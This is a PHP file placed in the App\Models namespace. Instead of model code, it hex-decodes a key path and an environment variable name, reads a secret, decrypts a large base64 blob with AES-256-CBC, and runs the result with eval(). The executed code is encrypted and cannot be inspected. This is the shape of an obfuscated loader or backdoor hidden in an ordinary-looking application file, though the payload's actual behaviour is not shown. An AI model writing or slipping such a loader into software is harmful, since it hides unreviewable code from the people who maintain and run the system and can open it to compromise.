<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('DeJyjbGBzRL7LZxQAab6Ug==');

$c=base64_decode(

'+HKVxN8tvr6+DfIzpwUtiF51c6o6xo2f97DfNpzOtQSYndi+gdx1XW64hEhPbSi5CNYf0VCxlaQC' .
'KosDDO44Nxw/QKSk9qRFTNDMsiYLApwCdsc2pEQeoKlrfZExmTiIyc78660zHDCfr3OG94bxk/ag' .
'A0ktSaySXPgn1e3xNLdDy6YY6bBdfkUYp6KOsmiWxDvDrWrG7UYUjPV0sCQBIZMv2NDKcxOwixzJ' .
'uENUji3inKMBNPp3kRGQ3vQyvUmM+zK+ESuITVWugjwQgdriErUqtGrXO7D3WTf2tbeuz12p/CY8' .
'7nGBHEh0qB7zaASh9oEgD91jXItzxUjJpP13+Vj87sYgcX6tv5ojtmgR3MccEgtoTWpxNQtg6J6U' .
'7A9brurhOdeCPovi27DAjNUhRRCu9ATytc2vhTgSsg5QCd3YbZKjbu+6Gp92E+Cdma9uO7E3VPtt' .
'+XTGxelJcBNaFcMNlAyfD+IanvRzk0vfqrBMInJMXpKw0y12NSozdeDEJabgFP1uZfDGEdX77KYU' .
'CzOzSVsam4sAxV+hgDdEHZfu+Cn8lcnppK9jqn20rKBfqTzr2TtNe4ohc2YyhEUaldnFdCvDFOrL' .
'S6S2UzpuJ5fYe4NHNpYpSzF0SGRw9okKLkyqxnzMkMels1322Ng4xqLt1s87QL6fKxXXUHr4ptw/' .
'qubnQQ4upVWeBcpMSDvM4HzV/rwsoI43urBwhqkI3C/azaZzhU3eEH83q6HaQ7HKldXXuREjwt2u' .
'NqggeECJERyp5qMjQDsiOV352Vl1sGd6YVA0q7tj557UBCPdNIj0OAEeyUL7Ubv7L8kLFr1rc07Z' .
'/9IcdLUF7IjNpbcXqxwHNttb2Mpw5LTDoRIBesIKyXPnn+Qe1i0wkO48mHt7YwE4sq9uhmzCOFNB' .
'NbHQLngSB7HY983HrEN5h1jmVAZLYRXtxKQrWiEQqWQt5W8tsN0OwF5cbw3Gw0zDcMZGVZzmOh1i' .
'3kX2BA9a+cKfx0cSkUSb6jMvFQuk69PstNzwsnMR1/w/X7dmb5V1uuHxA80JzcIniByq7ba4ySub' .
'qu2CSyegfeBb1i3xuk9ojyVMEgtvZh+DkXvQGH+sCyCiXsH+1Ltv9pY7DF6iZabVDapxpWnvIRnD' .
'3rp5w0hqc9AJJPtKF8JHJoJIPl8rPZzH1FXwbw9qIIMFzwypnaqa3y0CjUQRFJze4Bgqvu2bAlPC'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

